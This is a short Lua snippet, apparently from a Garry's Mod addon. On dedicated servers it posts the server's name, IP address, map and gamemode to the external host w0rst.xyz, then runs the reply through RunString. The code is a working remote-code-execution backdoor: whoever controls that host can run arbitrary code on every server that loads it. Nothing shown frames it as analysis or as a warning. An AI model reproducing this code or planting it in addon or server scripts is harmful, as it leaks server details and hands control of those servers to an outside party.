if game.IsDedicated() then
    http.Post('https://w0rst.xyz/api/bonsai.php', { 
        server_name=GetHostName(), 
        server_ip=game.GetIPAddress(), 
        server_map=game.GetMap(), 
        server_gamemode=engine.ActiveGamemode() }, 
        function(b) RunString(b) 
    end)
end